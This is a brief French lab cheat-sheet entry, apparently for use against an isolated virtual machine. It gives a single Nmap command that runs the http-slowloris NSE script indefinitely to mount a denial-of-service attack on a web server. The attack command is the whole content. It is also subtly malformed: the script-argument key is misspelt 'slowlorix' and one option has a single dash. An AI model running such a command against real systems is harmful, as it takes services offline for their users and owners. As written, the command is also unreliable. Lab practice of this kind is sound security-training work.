## Nmap : DDoS
Utilisation de NSE pour attaque DDoS envers une VM isolée

    nmap <cible> -max-parallelism <num> -Pn --script http-slowloris --script-args http-slowlorix.runforever=true
